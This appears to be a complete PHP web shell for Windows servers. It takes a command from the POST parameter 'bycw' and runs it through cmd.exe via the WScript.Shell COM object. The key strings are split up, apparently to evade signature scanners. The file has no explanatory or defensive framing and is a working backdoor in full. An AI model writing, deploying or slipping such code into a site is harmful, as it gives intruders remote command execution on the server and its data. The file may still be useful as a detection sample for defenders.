<?php
if($_POST['bycw']){
	echo $_POST['bycw'];
	$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
    $exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['bycw']."");
    $stdout = $exec->StdOut();
    $stcom = $stdout->ReadAll();
}
?>